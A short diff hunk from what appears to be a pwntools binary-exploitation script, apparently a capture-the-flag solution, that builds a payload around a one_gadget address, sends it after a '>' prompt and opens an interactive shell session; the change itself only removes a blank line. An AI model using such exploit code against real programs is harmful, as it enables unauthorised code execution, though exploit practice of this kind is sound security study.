@@ -14,7 +14,6 @@ payload += p64(one_gadget)
 payload += p64(0)*14
 
 
-
 io.recvuntil(">")
 io.sendline(payload)
 io.interactive()
